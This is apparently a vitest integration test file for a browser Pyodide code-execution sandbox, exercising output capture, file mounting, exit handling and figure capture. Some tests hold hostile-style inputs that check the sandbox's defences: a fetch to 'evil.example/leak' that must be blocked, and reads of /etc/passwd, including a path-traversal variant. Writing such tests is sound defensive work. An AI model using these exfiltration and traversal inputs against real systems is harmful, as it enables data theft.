import { existsSync } from "node:fs";
import { afterEach, describe, expect, it, vi } from "vitest";
import { bootstrapWorker } from "./pyodide.worker";
import { AttachmentMounter } from "./attachmentMounter";
import { MOUNT_ROOT, type HostToWorker, type WorkerToHost } from "./protocol";

/**
 * The whole worker pipeline against the real vendored dist: the network gate,
 * the interpreter boot from static/pyodide/, code execution with output
 * capture, file mounting, and the network refusal — everything the browser
 * worker will do, driven from Node so it can run in the ordinary server test
 * project. This is the test that fails if the runtime files drift, the gate
 * springs a leak, or the interpreter stops booting.
 */

const INDEX_URL = `${import.meta.dirname}/static/pyodide/`.replace(
	"/src/lib/utils/execution/",
	"/"
);

// The dist is generated, not committed: `npm run sync-pyodide` (the prebuild
// hook) fetches ~325 MB from the pyodide CDN and PyPI. Without it — CI, a fresh
// clone before its first build — there is nothing to test, so the suite skips
// rather than failing on a missing file.
const DIST_PRESENT = existsSync(`${INDEX_URL}pyodide.asm.wasm`);

// Pyodide echoes each asserted SystemExit a second time through its internal
// event loop, where no await can reach it. In a real worker scope the
// guardCleanExitRejection hook swallows that shape; the Node harness has no
// worker scope to hang it on, so without this the two strays surface as
// unhandled rejections and fail the run even though every assertion holds
// (formerly a known CI exclusion:
// reports/2026-09-24-thin-agent-progress.md). The match is deliberately
// narrow — a traceback body ending in a SystemExit line, i.e. a duplicate of
// a verdict the exit test asserts — and anything else is rethrown, so a real
// leak still fails loudly instead of hiding behind this handler.
process.on("unhandledRejection", (reason: unknown) => {
	const message = reason instanceof Error ? reason.message : String(reason ?? "");
	const last =
		message
			.split("\n")
			.map((line) => line.trim())
			.filter(Boolean)
			.at(-1) ?? "";
	if (
		/(Traceback|PythonError|webloop|_pyodide)/.test(message) &&
		/^SystemExit(?::\s*.*)?$/.test(last)
	) {
		return;
	}
	setImmediate(() => {
		throw reason;
	});
});

interface FakeScope {
	location: { origin: string };
	postMessage: (message: WorkerToHost) => void;
	onmessage: ((event: MessageEvent<HostToWorker>) => void) | null;
	fetch: typeof fetch;
	sent: WorkerToHost[];
}

const rawNetwork = vi.hoisted(() =>
	vi.fn(async (_input: RequestInfo | URL, _init?: RequestInit) => {
		throw new Error("the raw network was reached");
	})
);

/**
 * In Node, Pyodide's `js` bridge reflects the process global scope, not the
 * fake worker scope — so the gate is installed on the real `fetch` here, the
 * same way installNetworkGate does it inside the worker. A blocked URL must
 * then reject with the gate's message, never reach the raw network (which
 * fails loudly), and never be excused by a DNS error.
 */
function gateProcessFetch(): void {
	const gated = ((input: RequestInfo | URL, init?: RequestInit) => {
		const url = new URL(
			input instanceof Request ? input.url : String(input),
			"http://runtime.test"
		);
		if (url.origin !== "http://runtime.test" || !url.pathname.startsWith("/pyodide/")) {
			return Promise.reject(new TypeError("blocked by the execution sandbox"));
		}
		return rawNetwork(input, init);
	}) as typeof fetch;
	vi.stubGlobal("fetch", gated);
}

afterEach(() => {
	vi.unstubAllGlobals();
	rawNetwork.mockClear();
});

function makeScope(): FakeScope {
	const sent: WorkerToHost[] = [];
	const scope: FakeScope = {
		location: { origin: "http://runtime.test" },
		postMessage: (message) => sent.push(message),
		onmessage: null,
		fetch: globalThis.fetch,
		sent,
	};
	bootstrapWorker(scope as unknown as Parameters<typeof bootstrapWorker>[0], {
		indexURL: INDEX_URL,
	});
	return scope;
}

function send(scope: FakeScope, message: HostToWorker): void {
	scope.onmessage?.({ data: message } as MessageEvent<HostToWorker>);
}

async function until(
	scope: FakeScope,
	matches: (message: WorkerToHost) => boolean,
	timeoutMs = 150_000
): Promise<WorkerToHost> {
	const deadline = Date.now() + timeoutMs;
	for (;;) {
		const found = scope.sent.find(matches);
		if (found) return found;
		if (Date.now() > deadline) throw new Error("the worker never answered");
		await new Promise((resolve) => setTimeout(resolve, 100));
	}
}

describe.skipIf(!DIST_PRESENT)("pyodide worker pipeline (real dist)", () => {
	it(
		"boots, runs code, captures output, mounts files and refuses the network",
		async () => {
			gateProcessFetch();
			const scope = makeScope();

			send(scope, { type: "run", id: 1, code: "print('hello from python')\n6 * 7" });
			const first = (await until(scope, (m) => m.type === "result" && m.id === 1)) as Extract<
				WorkerToHost,
				{ type: "result" }
			>;
			expect(first.ok).toBe(true);
			expect(first.stdout).toContain("hello from python");
			expect(first.result).toBe("42");
			expect(scope.sent.some((m) => m.type === "ready")).toBe(true);

			// Files mount under /mnt/data and are readable by executed code.
			send(scope, {
				type: "loadFiles",
				id: 2,
				files: [{ name: "data.csv", data: "a,b\n1,2\n" }],
			});
			const loaded = (await until(scope, (m) => m.type === "filesLoaded" && m.id === 2)) as Extract<
				WorkerToHost,
				{ type: "filesLoaded" }
			> & { id: number };
			expect(loaded.written).toEqual([`${MOUNT_ROOT}/data.csv`]);
			send(scope, {
				type: "run",
				id: 3,
				code: `print(open('${MOUNT_ROOT}/data.csv').read().strip())`,
			});
			const readBack = (await until(scope, (m) => m.type === "result" && m.id === 3)) as Extract<
				WorkerToHost,
				{ type: "result" }
			>;
			expect(readBack.stdout).toContain("a,b");

			// The gate answers before the raw fetch: a cross-origin URL is dead.
			send(scope, {
				type: "run",
				id: 4,
				code: "import js\ntry:\n    await js.fetch('https://evil.example/leak')\n    print('FETCH-WORKED')\nexcept Exception:\n    print('FETCH-BLOCKED')",
			});
			const gated = (await until(scope, (m) => m.type === "result" && m.id === 4)) as Extract<
				WorkerToHost,
				{ type: "result" }
			>;
			expect(gated.ok).toBe(true);
			expect(gated.stdout).toContain("FETCH-BLOCKED");
			expect(gated.stdout).not.toContain("FETCH-WORKED");

			// Mounted files can be removed again, and only from the mount root.
			send(scope, { type: "removeFile", id: 5, path: `${MOUNT_ROOT}/data.csv` });
			const removed = (await until(
				scope,
				(m) => m.type === "fileRemoved" && m.id === 5
			)) as Extract<WorkerToHost, { type: "fileRemoved" }> & { id: number };
			expect(removed.error).toBeUndefined();
			send(scope, { type: "removeFile", id: 6, path: "/etc/passwd" });
			const refused = (await until(
				scope,
				(m) => m.type === "fileRemoved" && m.id === 6
			)) as Extract<WorkerToHost, { type: "fileRemoved" }> & { id: number };
			expect(refused.error).toBeDefined();
		},
		{ timeout: 180_000 }
	);

	it(
		"an attached file is reachable at /mnt/data/<name> from a code run, with its text beside it",
		async () => {
			const scope = makeScope();
			send(scope, { type: "run", id: 1, code: "1" });
			await until(scope, (m) => m.type === "result" && m.id === 1);

			// The mounter talks to the real worker through the same messages the
			// host's ExecutionSession sends; only the download route is stubbed.
			let next = 10;
			const request = async <T extends WorkerToHost>(
				message: HostToWorker & { id: number },
				reply: T["type"]
			) => (await until(scope, (m) => m.type === reply && "id" in m && m.id === message.id)) as T;
			const session = {
				loadFiles: async (files: Array<{ name: string; data: ArrayBuffer | string }>) => {
					const id = next++;
					send(scope, { type: "loadFiles", id, files });
					const done = await request<Extract<WorkerToHost, { type: "filesLoaded" }>>(
						{ type: "loadFiles", id, files },
						"filesLoaded"
					);
					return done.written;
				},
				removeFile: async (path: string) => {
					const id = next++;
					send(scope, { type: "removeFile", id, path });
					await request({ type: "removeFile", id, path }, "fileRemoved");
				},
			};
			const served: Record<string, string> = {
				"/conversation/c1/output/h1": "a,b\n1,2\n",
				"/conversation/c1/output/t1": "# the extracted text",
			};
			vi.stubGlobal(
				"fetch",
				vi.fn(async (url: string) => {
					const text = served[url];
					return text === undefined
						? new Response("{}", { status: 404 })
						: new Response(text, { headers: { "Content-Length": String(text.length) } });
				})
			);
			const mounter = new AttachmentMounter("c1", session, {
				mounted: () => {},
				skipped: () => {},
			});
			await mounter.sync([
				{
					type: "hash",
					value: "h1",
					name: "sales data.csv",
					mime: "text/csv",
					extracted: { value: "t1" },
				},
			]);

			send(scope, {
				type: "run",
				id: 2,
				code: `print(open('${MOUNT_ROOT}/sales data.csv').read().strip())\nprint(open('${MOUNT_ROOT}/sales data.csv.md').read())`,
			});
			const ran = (await until(scope, (m) => m.type === "result" && m.id === 2)) as Extract<
				WorkerToHost,
				{ type: "result" }
			>;
			expect(ran.ok).toBe(true);
			expect(ran.stdout).toContain("a,b\n1,2");
			expect(ran.stdout).toContain("# the extracted text");

			// Leaving the conversation takes both files back out.
			expect(await mounter.unmountAll()).toEqual([
				`${MOUNT_ROOT}/sales data.csv`,
				`${MOUNT_ROOT}/sales data.csv.md`,
			]);
			send(scope, {
				type: "run",
				id: 3,
				code: `import os\nprint(os.path.exists('${MOUNT_ROOT}/sales data.csv'))`,
			});
			const gone = (await until(scope, (m) => m.type === "result" && m.id === 3)) as Extract<
				WorkerToHost,
				{ type: "result" }
			>;
			expect(gone.stdout).toContain("False");
		},
		{ timeout: 180_000 }
	);

	it(
		"reports a clean interpreter exit as success, not an error",
		async () => {
			// The two SystemExits asserted below each echo a stray duplicate
			// through Pyodide's event loop; the file-level handler above
			// swallows exactly that shape.
			gateProcessFetch();
			const scope = makeScope();

			send(scope, { type: "run", id: 1, code: "import sys\nprint('before exit')\nsys.exit(0)" });
			const clean = (await until(scope, (m) => m.type === "result" && m.id === 1)) as Extract<
				WorkerToHost,
				{ type: "result" }
			>;
			// A script that worked must not wear the ERROR block: exit(0) is
			// success, with the output it printed still captured.
			expect(clean.ok).toBe(true);
			expect(clean.error).toBeUndefined();
			expect(clean.stdout).toContain("before exit");

			send(scope, { type: "run", id: 2, code: "import sys\nsys.exit(3)" });
			const dirty = (await until(scope, (m) => m.type === "result" && m.id === 2)) as Extract<
				WorkerToHost,
				{ type: "result" }
			>;
			expect(dirty.ok).toBe(false);
			expect(dirty.error).toContain("SystemExit");

			// The interpreter survives the exit: the next run works.
			send(scope, { type: "run", id: 3, code: "40 + 2" });
			const after = (await until(scope, (m) => m.type === "result" && m.id === 3)) as Extract<
				WorkerToHost,
				{ type: "result" }
			>;
			expect(after.ok).toBe(true);
			expect(after.result).toBe("42");
		},
		{ timeout: 180_000 }
	);

	it(
		"lists generated files and reads them back for download",
		async () => {
			gateProcessFetch();
			const scope = makeScope();

			send(scope, {
				type: "run",
				id: 2,
				code: "from pathlib import Path\nPath('hello.txt').write_text('hello download')",
			});
			const written = (await until(scope, (m) => m.type === "result" && m.id === 2)) as Extract<
				WorkerToHost,
				{ type: "result" }
			>;
			expect(written.ok).toBe(true);

			send(scope, { type: "listFiles", id: 3 });
			const listed = (await until(scope, (m) => m.type === "filesListed" && m.id === 3)) as Extract<
				WorkerToHost,
				{ type: "filesListed" }
			>;
			const entry = listed.files.find((f) => f.path.endsWith("/hello.txt"));
			expect(entry).toBeDefined();
			expect(entry?.size).toBeGreaterThan(0);

			send(scope, { type: "readFile", id: 4, path: entry?.path ?? "" });
			const data = (await until(scope, (m) => m.type === "fileData" && m.id === 4)) as Extract<
				WorkerToHost,
				{ type: "fileData" }
			>;
			expect(data.error).toBeUndefined();
			expect(Buffer.from(data.data ?? new ArrayBuffer(0)).toString("utf8")).toBe("hello download");

			// Outside the readable roots, and traversal besides: refused, with
			// the reason named rather than a hang.
			for (const [id, path] of [
				[5, "/etc/passwd"],
				[6, "/home/pyodide/../../etc/passwd"],
				[7, "/lib/python314.zip"],
				[8, "/home/pyodide/does-not-exist.txt"],
			] as Array<[number, string]>) {
				send(scope, { type: "readFile", id, path });
				const refused = (await until(
					scope,
					(m) => m.type === "fileData" && "id" in m && m.id === id
				)) as Extract<WorkerToHost, { type: "fileData" }>;
				expect(refused.data).toBeUndefined();
				expect(refused.error).toBeDefined();
			}
		},
		{ timeout: 180_000 }
	);

	it(
		"the auto-install pass leaves ordinary runs alone and unknown imports fail normally",
		async () => {
			// The worker installs a run's own imports before it runs (see
			// ./autoInstallImports): lock-file packages via
			// loadPackagesFromImports, vendored document packages through
			// micropip. Both tiers are best-effort — this guards the wiring
			// against the real interpreter without needing any network: a
			// stdlib-only run must come back clean with no install chatter,
			// and an unrecognized import must still report the interpreter's
			// own ModuleNotFoundError rather than hanging or crashing.
			gateProcessFetch();
			const scope = makeScope();

			send(scope, {
				type: "run",
				id: 1,
				code: "import collections\nprint(collections.Counter('aab'))",
			});
			const stdlib = (await until(scope, (m) => m.type === "result" && m.id === 1)) as Extract<
				WorkerToHost,
				{ type: "result" }
			>;
			expect(stdlib.ok).toBe(true);
			expect(stdlib.stdout).toContain("Counter");
			expect(stdlib.stdout).not.toContain("Installing");

			send(scope, { type: "run", id: 2, code: "import not_a_real_module_xyz" });
			const unknown = (await until(scope, (m) => m.type === "result" && m.id === 2)) as Extract<
				WorkerToHost,
				{ type: "result" }
			>;
			expect(unknown.ok).toBe(false);
			expect(unknown.error).toContain("ModuleNotFoundError");
			expect(unknown.error).toContain("not_a_real_module_xyz");
		},
		{ timeout: 180_000 }
	);
	it(
		"captures matplotlib figures as figure-<n>.png: Agg backend, show() saves and closes, end-of-run sweep, 20-figure cap",
		async () => {
			gateProcessFetch();
			const scope = makeScope();
			const runCode = async (id: number) =>
				(await until(scope, (m) => m.type === "result" && m.id === id)) as Extract<
					WorkerToHost,
					{ type: "result" }
				>;
			const list = async (id: number) => {
				send(scope, { type: "listFiles", id });
				const listed = (await until(
					scope,
					(m) => m.type === "filesListed" && m.id === id
				)) as Extract<WorkerToHost, { type: "filesListed" }>;
				return listed.files.map((f) => f.path.split("/").pop()).sort();
			};

			// show() saves what is open and closes it; a figure left open is
			// swept when the run ends; the backend is Agg.
			send(scope, {
				type: "run",
				id: 1,
				code: [
					"import matplotlib",
					"import matplotlib.pyplot as plt",
					"print('backend', matplotlib.get_backend())",
					"plt.plot([1, 2, 3]); plt.show()",
					"print('open after show', len(plt.get_fignums()))",
					"plt.plot([3, 2, 1]); plt.show()",
					"plt.plot([2, 2, 2])",
				].join("\n"),
			});
			const first = await runCode(1);
			expect(first.error).toBeUndefined();
			expect(first.ok).toBe(true);
			expect(first.stdout).toContain("backend Agg");
			expect(first.stdout).toContain("open after show 0");
			expect(await list(2)).toEqual(["figure-1.png", "figure-2.png", "figure-3.png"]);

			send(scope, { type: "readFile", id: 3, path: "/home/pyodide/figure-1.png" });
			const png = (await until(scope, (m) => m.type === "fileData" && m.id === 3)) as Extract<
				WorkerToHost,
				{ type: "fileData" }
			>;
			expect([...new Uint8Array(png.data ?? new ArrayBuffer(0)).slice(0, 4)]).toEqual([
				0x89, 0x50, 0x4e, 0x47,
			]);

			// Numbering restarts each run (stable names). A run that draws
			// nothing lists nothing, but the last run's figure is still on
			// disk for code that wants it again.
			send(scope, { type: "run", id: 4, code: "import matplotlib.pyplot as plt\nplt.plot([1])" });
			expect((await runCode(4)).ok).toBe(true);
			expect(await list(5)).toEqual(["figure-1.png"]);
			send(scope, {
				type: "run",
				id: 6,
				code: "import os\nprint('kept', os.path.exists('figure-1.png'))",
			});
			const quiet = await runCode(6);
			expect(quiet.stdout).toContain("kept True");
			expect(await list(7)).toEqual([]);

			// A figure the code saved itself is its own card, not a second one
			// from the sweep — with or without a close() or show() after it.
			send(scope, {
				type: "run",
				id: 12,
				code: [
					"import matplotlib.pyplot as plt",
					"plt.plot([1]); plt.savefig('chart.png')",
					"plt.figure(); plt.plot([2]); plt.savefig('other.png'); plt.show()",
				].join("\n"),
			});
			expect((await runCode(12)).ok).toBe(true);
			expect(await list(13)).toEqual(["chart.png", "other.png"]);

			// A run that fails after drawing still keeps its figure.
			send(scope, {
				type: "run",
				id: 8,
				code: "import matplotlib.pyplot as plt\nplt.plot([1])\nraise ValueError('boom')",
			});
			expect((await runCode(8)).ok).toBe(false);
			expect(await list(9)).toEqual(["figure-1.png"]);

			// A loop drawing 25 figures keeps 20 and says so.
			send(scope, {
				type: "run",
				id: 10,
				code: "import matplotlib.pyplot as plt\nfor i in range(25):\n    plt.figure(); plt.plot([i])\n    plt.show()",
			});
			const capped = await runCode(10);
			expect(capped.ok).toBe(true);
			expect(capped.stderr).toContain("first 20 figures");
			const names = await list(11);
			expect(names).toHaveLength(20);
			expect(names).toContain("figure-20.png");
			expect(names).not.toContain("figure-21.png");
		},
		{ timeout: 240_000 }
	);
});
